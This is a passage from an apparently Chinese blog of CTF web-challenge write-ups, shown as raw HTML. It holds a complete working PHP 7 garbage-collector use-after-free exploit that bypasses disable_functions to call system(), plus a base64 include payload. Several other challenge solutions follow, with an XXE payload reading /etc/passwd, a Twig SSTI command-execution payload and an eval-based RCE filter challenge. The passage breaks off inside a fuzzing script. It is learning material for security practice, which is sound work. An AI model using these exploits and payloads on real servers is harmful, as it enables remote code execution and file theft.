&#123;</span><br><span class=\"line\">        $out = &quot;&quot;;</span><br><span class=\"line\">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class=\"line\">            $out .= chr($ptr &amp; 0xff);</span><br><span class=\"line\">            $ptr &gt;&gt;= 8;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return $out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class=\"line\">        $i = 0;</span><br><span class=\"line\">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class=\"line\">            $str[$p + $i] = chr($v &amp; 0xff);</span><br><span class=\"line\">            $v &gt;&gt;= 8;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class=\"line\">        global $abc, $helper;</span><br><span class=\"line\">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class=\"line\">        $leak = strlen($helper-&gt;a);</span><br><span class=\"line\">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class=\"line\">        return $leak;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function parse_elf($base) &#123;</span><br><span class=\"line\">        $e_type = leak($base, 0x10, 2);</span><br><span class=\"line\"></span><br><span class=\"line\">        $e_phoff = leak($base, 0x20);</span><br><span class=\"line\">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class=\"line\">        $e_phnum = leak($base, 0x38, 2);</span><br><span class=\"line\"></span><br><span class=\"line\">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class=\"line\">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class=\"line\">            $p_type  = leak($header, 0, 4);</span><br><span class=\"line\">            $p_flags = leak($header, 4, 4);</span><br><span class=\"line\">            $p_vaddr = leak($header, 0x10);</span><br><span class=\"line\">            $p_memsz = leak($header, 0x28);</span><br><span class=\"line\"></span><br><span class=\"line\">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write</span><br><span class=\"line\">                # handle pie</span><br><span class=\"line\">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class=\"line\">                $data_size = $p_memsz;</span><br><span class=\"line\">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec</span><br><span class=\"line\">                $text_size = $p_memsz;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class=\"line\">            return false;</span><br><span class=\"line\"></span><br><span class=\"line\">        return [$data_addr, $text_size, $data_size];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function get_basic_funcs($base, $elf) &#123;</span><br><span class=\"line\">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class=\"line\">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class=\"line\">            $leak = leak($data_addr, $i * 8);</span><br><span class=\"line\">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class=\"line\">                $deref = leak($leak);</span><br><span class=\"line\">                # &#x27;constant&#x27; constant check</span><br><span class=\"line\">                if($deref != 0x746e6174736e6f63)</span><br><span class=\"line\">                    continue;</span><br><span class=\"line\">            &#125; else continue;</span><br><span class=\"line\"></span><br><span class=\"line\">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class=\"line\">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class=\"line\">                $deref = leak($leak);</span><br><span class=\"line\">                # &#x27;bin2hex&#x27; constant check</span><br><span class=\"line\">                if($deref != 0x786568326e6962)</span><br><span class=\"line\">                    continue;</span><br><span class=\"line\">            &#125; else continue;</span><br><span class=\"line\"></span><br><span class=\"line\">            return $data_addr + $i * 8;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function get_binary_base($binary_leak) &#123;</span><br><span class=\"line\">        $base = 0;</span><br><span class=\"line\">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class=\"line\">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class=\"line\">            $addr = $start - 0x1000 * $i;</span><br><span class=\"line\">            $leak = leak($addr, 0, 7);</span><br><span class=\"line\">            if($leak == 0x10102464c457f) &#123; # ELF header</span><br><span class=\"line\">                return $addr;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function get_system($basic_funcs) &#123;</span><br><span class=\"line\">        $addr = $basic_funcs;</span><br><span class=\"line\">        do &#123;</span><br><span class=\"line\">            $f_entry = leak($addr);</span><br><span class=\"line\">            $f_name = leak($f_entry, 0, 6);</span><br><span class=\"line\"></span><br><span class=\"line\">            if($f_name == 0x6d6574737973) &#123; # system</span><br><span class=\"line\">                return leak($addr + 8);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $addr += 0x20;</span><br><span class=\"line\">        &#125; while($f_entry != 0);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class ryat &#123;</span><br><span class=\"line\">        var $ryat;</span><br><span class=\"line\">        var $chtg;</span><br><span class=\"line\">        </span><br><span class=\"line\">        function __destruct()</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $this-&gt;chtg = $this-&gt;ryat;</span><br><span class=\"line\">            $this-&gt;ryat = 1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class Helper &#123;</span><br><span class=\"line\">        public $a, $b, $c, $d;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class=\"line\">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $n_alloc = 10; # increase this value if you get segfaults</span><br><span class=\"line\"></span><br><span class=\"line\">    $contiguous = [];</span><br><span class=\"line\">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class=\"line\">        $contiguous[] = str_repeat(&#x27;A&#x27;, 79);</span><br><span class=\"line\"></span><br><span class=\"line\">    $poc = &#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;;</span><br><span class=\"line\">    $out = unserialize($poc);</span><br><span class=\"line\">    gc_collect_cycles();</span><br><span class=\"line\"></span><br><span class=\"line\">    $v = [];</span><br><span class=\"line\">    $v[0] = ptr2str(0, 79);</span><br><span class=\"line\">    unset($v);</span><br><span class=\"line\">    $abc = $out[2][0];</span><br><span class=\"line\"></span><br><span class=\"line\">    $helper = new Helper;</span><br><span class=\"line\">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class=\"line\">        die(&quot;UAF failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # leaks</span><br><span class=\"line\">    $closure_handlers = str2ptr($abc, 0);</span><br><span class=\"line\">    $php_heap = str2ptr($abc, 0x58);</span><br><span class=\"line\">    $abc_addr = $php_heap - 0xc8;</span><br><span class=\"line\"></span><br><span class=\"line\">    # fake value</span><br><span class=\"line\">    write($abc, 0x60, 2);</span><br><span class=\"line\">    write($abc, 0x70, 6);</span><br><span class=\"line\"></span><br><span class=\"line\">    # fake reference</span><br><span class=\"line\">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class=\"line\">    write($abc, 0x18, 0xa);</span><br><span class=\"line\"></span><br><span class=\"line\">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class=\"line\"></span><br><span class=\"line\">    $binary_leak = leak($closure_handlers, 8);</span><br><span class=\"line\">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class=\"line\">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(!($elf = parse_elf($base))) &#123;</span><br><span class=\"line\">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class=\"line\">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class=\"line\">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # fake closure object</span><br><span class=\"line\">    $fake_obj_offset = 0xd0;</span><br><span class=\"line\">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class=\"line\">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # pwn</span><br><span class=\"line\">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class=\"line\">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class=\"line\">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class=\"line\"></span><br><span class=\"line\">    ($helper-&gt;b)($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">    exit();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在蚁剑可以看出tmp文件夹权限可以上传，上传以后使用文件包含输出执行结果。文件包含payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?Ginkgo=aW5jbHVkZSgnL3RtcC9waHA3LWdjLWJ5cGFzcy5waHAnKTs=</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"03-02\"><a href=\"#03-02\" class=\"headerlink\" title=\"03.02\"></a>03.02</h1><hr>\n<h1 id=\"NCTF2019-Fake-XML-cookbook\"><a href=\"#NCTF2019-Fake-XML-cookbook\" class=\"headerlink\" title=\"[NCTF2019]Fake XML cookbook\"></a>[NCTF2019]Fake XML cookbook</h1><p>根据题目是XML，首先想到是XXE，虽然咱没学过但是可以去搜简单的payload。</p>\n<p>使用bp抓个包，POST中传入的是标签格式，可以确定是XXE类型的题目</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\">Content-Type: application/xml;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;1&lt;/username&gt;&lt;password&gt;2&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n\n<p>去摸一个payload试试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE test [</span><br><span class=\"line\">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class=\"line\">  ]&gt;</span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n\n<p>成功读取文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302110439.png\"></p>\n<p>把路径改为/flag，获得flag</p>\n<hr>\n<h1 id=\"ASIS-2019-Unicorn-shop\"><a href=\"#ASIS-2019-Unicorn-shop\" class=\"headerlink\" title=\"[ASIS 2019]Unicorn shop\"></a>[ASIS 2019]Unicorn shop</h1><p>这道题绝活。学到了unicode的安全问题：<a href=\"https://xz.aliyun.com/t/5402\">浅谈Unicode设计的安全性</a>，看了wp。</p>\n<p>进入网站一个本杰明·富兰克林至理名言：</p>\n<blockquote>\n<p>金钱从来不会使人幸福，也不会使人幸福；它的本性中没有任何东西可以产生幸福。幸福拥有的越多，想要的就越多</p>\n</blockquote>\n<p><del>差点信了，我就要赚钱花(小声bb)</del></p>\n<p>下面两个输入框，一个ID一个钱，上面一个独角兽商品列表，一看就是让买东西，但是1-3商品输入ID都提示错误，只有第四个可以买到，但是第四个输入钱的时候只能输入1位，然鹅4号价格是1377，显然买不到，输入多个又提示                                    ，所以思路就是找一个unicode字符，它的数字格式值是大于1377的。</p>\n<p>一个和unicode有关的网站：<a href=\"https://www.compart.com/en/unicode\">https://www.compart.com/en/unicode</a></p>\n<p>网站导航栏找到Character Categories分类，这个下有三个和数相关的：Decimal Number、Letter Number、Other Number，第一个里面都是正常数值的unicode，建议去后面两个找。怎么找：<kbd>Ctrl</kbd>+<kbd>F</kbd>搜索thousand，找1377以上的都可。</p>\n<p>我选的是这个<code>፼</code>数值是1w，直接传传不过去，使用url编码一次再传。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302113544.png\"></p>\n<hr>\n<h1 id=\"BJDCTF2020-Cookie-is-so-stable\"><a href=\"#BJDCTF2020-Cookie-is-so-stable\" class=\"headerlink\" title=\"[BJDCTF2020]Cookie is so stable\"></a>[BJDCTF2020]Cookie is so stable</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210304092035.png\"></p>\n<p>这道题和The mystery of ip的网站一样，还有可能是ssti，hint.php的注释里有</p>\n<blockquote>\n<p>Why not take a closer look at cookies?</p>\n</blockquote>\n<p>去flag.php提交个1之后，看cookie为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1</span><br></pre></td></tr></table></figure>\n\n<p>一目了然，接下来就是找payload。再使用之前的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure>\n\n<p>被拦下来了，说明加强了过滤。在这之后去看了wp，网上的wp都是直接给出了payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我是受了这位师傅的<a href=\"https://www.cnblogs.com/bmjoker/p/13508538.html\">文章</a>启发，又去结合了下这道题的<a href=\"https://github.com/BjdsecCA/BJDCTF2020_January/tree/f73ac63336d9161d3c91354ce3eac943c403d4fb/Web/ssti_twig\">源码</a>才搞明白。</p>\n<p>这道题在渲染之前使用了twig模板：</p>\n<blockquote>\n<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p>\n</blockquote>\n<p>我同样在题目的源码中找到了<code>render()</code>方法和<code>Twig_Environment</code>配置信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160322.png\"></p>\n<p>然后payload的具体原理在的<code>Environment.php</code>中,贴一下和payload相关部分：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160722.png\"></p>\n<ol>\n<li>先执行<code>&#123;&#123;_self.env.registerUndefinedFilterCallback(\"exec\")&#125;&#125;</code>调用了<code>registerUndefinedFilterCallback()</code>函数(图中884行)，注册了一个未定义的函数到<code>filterCallbacks</code>全局变量中</li>\n<li>接着执行<code>&#123;&#123;_self.env.getFilter(\"whoami\")&#125;&#125;</code>调用了<code>getFilter()</code>函数，并传入变量<code>$name</code>值为执行的命令，当函数执行到图中代码875行时，进入循环执行了<code>call_user_func()</code>，这个函数大伙肯定不陌生：call_user_func 可以把第一个参数作为回调函数调用，调用的参数来源就是第一步中注册的<code>filterCallbacks</code>全局变量，里边已经躺好了一个刚刚注册的<code>exec</code>，至此就形成了payload</li>\n</ol>\n<hr>\n<h1 id=\"小彩蛋\"><a href=\"#小彩蛋\" class=\"headerlink\" title=\"小彩蛋\"></a>小彩蛋</h1><p>现在(2021年3月2日16:32:44)刚好做完题，想回到BUU上整理过程，发现502了，然后去群里就看到了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163452.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163636.png\"></p>\n<p>挺草的记一下。</p>\n<hr>\n<h1 id=\"CISCN-2019-初赛-Love-Math\"><a href=\"#CISCN-2019-初赛-Love-Math\" class=\"headerlink\" title=\"[CISCN 2019 初赛]Love Math\"></a>[CISCN 2019 初赛]Love Math</h1><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//例子 c=20-1</span></span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strlen(<span class=\"variable\">$content</span>) &gt;= <span class=\"number\">80</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;太长了不会算&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$blacklist</span> = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\t&#x27;</span>, <span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\n&#x27;</span>,<span class=\"string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"string\">&#x27;&quot;&#x27;</span>, <span class=\"string\">&#x27;`&#x27;</span>, <span class=\"string\">&#x27;\\[&#x27;</span>, <span class=\"string\">&#x27;\\]&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$content</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class=\"line\">    <span class=\"variable\">$whitelist</span> = [<span class=\"string\">&#x27;abs&#x27;</span>, <span class=\"string\">&#x27;acos&#x27;</span>, <span class=\"string\">&#x27;acosh&#x27;</span>, <span class=\"string\">&#x27;asin&#x27;</span>, <span class=\"string\">&#x27;asinh&#x27;</span>, <span class=\"string\">&#x27;atan2&#x27;</span>, <span class=\"string\">&#x27;atan&#x27;</span>, <span class=\"string\">&#x27;atanh&#x27;</span>, <span class=\"string\">&#x27;base_convert&#x27;</span>, <span class=\"string\">&#x27;bindec&#x27;</span>, <span class=\"string\">&#x27;ceil&#x27;</span>, <span class=\"string\">&#x27;cos&#x27;</span>, <span class=\"string\">&#x27;cosh&#x27;</span>, <span class=\"string\">&#x27;decbin&#x27;</span>, <span class=\"string\">&#x27;dechex&#x27;</span>, <span class=\"string\">&#x27;decoct&#x27;</span>, <span class=\"string\">&#x27;deg2rad&#x27;</span>, <span class=\"string\">&#x27;exp&#x27;</span>, <span class=\"string\">&#x27;expm1&#x27;</span>, <span class=\"string\">&#x27;floor&#x27;</span>, <span class=\"string\">&#x27;fmod&#x27;</span>, <span class=\"string\">&#x27;getrandmax&#x27;</span>, <span class=\"string\">&#x27;hexdec&#x27;</span>, <span class=\"string\">&#x27;hypot&#x27;</span>, <span class=\"string\">&#x27;is_finite&#x27;</span>, <span class=\"string\">&#x27;is_infinite&#x27;</span>, <span class=\"string\">&#x27;is_nan&#x27;</span>, <span class=\"string\">&#x27;lcg_value&#x27;</span>, <span class=\"string\">&#x27;log10&#x27;</span>, <span class=\"string\">&#x27;log1p&#x27;</span>, <span class=\"string\">&#x27;log&#x27;</span>, <span class=\"string\">&#x27;max&#x27;</span>, <span class=\"string\">&#x27;min&#x27;</span>, <span class=\"string\">&#x27;mt_getrandmax&#x27;</span>, <span class=\"string\">&#x27;mt_rand&#x27;</span>, <span class=\"string\">&#x27;mt_srand&#x27;</span>, <span class=\"string\">&#x27;octdec&#x27;</span>, <span class=\"string\">&#x27;pi&#x27;</span>, <span class=\"string\">&#x27;pow&#x27;</span>, <span class=\"string\">&#x27;rad2deg&#x27;</span>, <span class=\"string\">&#x27;rand&#x27;</span>, <span class=\"string\">&#x27;round&#x27;</span>, <span class=\"string\">&#x27;sin&#x27;</span>, <span class=\"string\">&#x27;sinh&#x27;</span>, <span class=\"string\">&#x27;sqrt&#x27;</span>, <span class=\"string\">&#x27;srand&#x27;</span>, <span class=\"string\">&#x27;tan&#x27;</span>, <span class=\"string\">&#x27;tanh&#x27;</span>];</span><br><span class=\"line\">    preg_match_all(<span class=\"string\">&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;</span>, <span class=\"variable\">$content</span>, <span class=\"variable\">$used_funcs</span>);  </span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$used_funcs</span>[<span class=\"number\">0</span>] <span class=\"keyword\">as</span> <span class=\"variable\">$func</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$func</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//帮你算出答案</span></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;echo &#x27;</span>.<span class=\"variable\">$content</span>.<span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>快被搞死了，是一道有过滤限制的RCE，半天没有头绪就去看wp了。</p>\n<p><a href=\"https://www.cnblogs.com/20175211lyz/p/11588219.html\">刷题记录：[CISCN 2019 初赛]Love Math</a></p>\n<p>最后自己琢磨出来了一个payload，思路当然还是参考上面师傅博客的。</p>\n<p>利用<code>$whitelist</code>里的函数名称和数字遍历异或<code>^</code>，Fuzz找出来需要的字母，然后拼接一个<code>_GET</code>传参执行命令。</p>\n<p>Fuzz的代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$whitelist</span> = [<span class=\"string\">&#x27;abs&#x27;</span>, <span class=\"string\">&#x27;acos&#x27;</span>, <span class=\"string\">&#x27;acosh&#x27;</span>, <span class=\"string\">&#x27;asin&#x27;</span>, <span class=\"string\">&#x27;asinh&#x27;</span>, <span class=\"string\">&#x27;atan2&#x27;</span>, <span class=\"string\">&#x27;atan&#x27;</span>, <span class=\"string\">&#x27;atanh&#x27;</span>, <span class=\"string\">&#x27;base_convert&#x27;</span>, <span class=\"string\">&#x27;bindec&#x27;</span>, <span class=\"string\">&#x27;ceil&#x27;</span>, <span class=\"string\">&#x27;cos&#x27;</span>, <span class=\"string\">&#x27;cosh&#x27;</span>, <span class=\"string\">&#x27;decbin&#x27;</span>, <span class=\"string\">&#x27;dechex&#x27;</span>, <span class=\"string\">&#x27;decoct&#x27;</span>, <span class=\"string\">&#x27;deg2rad&#x27;</span>, <span class=\"string\">&#x27;exp&#x27;</span>, <span class=\"string\">&#x27;expm1&#x27;</span>, <span class=\"string\">&#x27;floor&#x27;</span>, <span class=\"string\">&#x27;fmod&#x27;</span>, <span class=\"string\">&#x27;getrandmax&#x27;</span>, <span class=\"string\">&#x27;hexdec&#x27;</span>, <span class=\"string\">&#x27;hypot&#x27;</span>, <span class=\"string\">&#x27;is_finite&#x27;</span>, <span class=\"string\">&#x27;is_infinite&#x27;</span>, <span class=\"string\">&#x27;is_nan&#x27;</span>, <span class=\"string\">&#x27;lcg_value&#x27;</span>, <span class=\"string\">&#x27;log10&#x27;</span>, <span class=\"string\">&#x27;log1p&#x27;</span>, <span class=\"string\">&#x27;log&#x27;</span>, <span class=\"string\">&#x27;max&#x27;</span>, <span class=\"string\">&#x27;min&#x27;</span>, <span class=\"string\">&#x27;mt_getrandmax&#x27;</span>, <span class=\"string\">&#x27;mt_rand&#x27;</span>, <span class=\"string\">&#x27;mt_srand&#x27;</span>, <span class=\"string\">&#x27;octdec&#x27;</span>, <span class=\"string\">&#x27;pi&#x27;</span>, <span class=\"string\">&#x27;pow&#x27;</span>, <span class=\"string\">&#x27;rad2deg&#x27;</span>, <span class=\"string\">&#x27;rand&#x27;</span>, <span class=\"string\">&#x27;round&#x27;</span>, <span class=\"string\">&#x27;sin&#x27;</span>, <span class=\"string\">&#x27;sinh&#x27;</span>, <span class=\"string\">&#x27;sqrt&#x27;</span>, <span class=\"string\">&#x27;srand&#x27;</span>, <span class=\"string\">&#x27;tan&#x27;</span>, <span class=\"string\">&#x27;tanh&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$exp</span>=<span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; count(<span class=\"variable\">$whitelist</span>); <span class=\"variable\">$i</span>++) &#123; </span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"variable\">$j</span>=<span class=\"number\">0</span>; <span class=\"variable\">$j</span> &lt; <span class=\"number\">1000</span>; <span class=\"variable\">$j</span>++) &#123; </span><br><span class=\"line\">\t\t<span class=\"variable\">$exp</span>=<span class=\"variable\">$whitelist</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$j</span>.<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"variable\">$whitelist</span>[<span class=\"variable\">$i</span>].<span class=\"string\">&quot;^&quot;</span>.<span class=\"variable\">$j</span>.<span class=\"string\">&quot;----&quot;</span>.<span 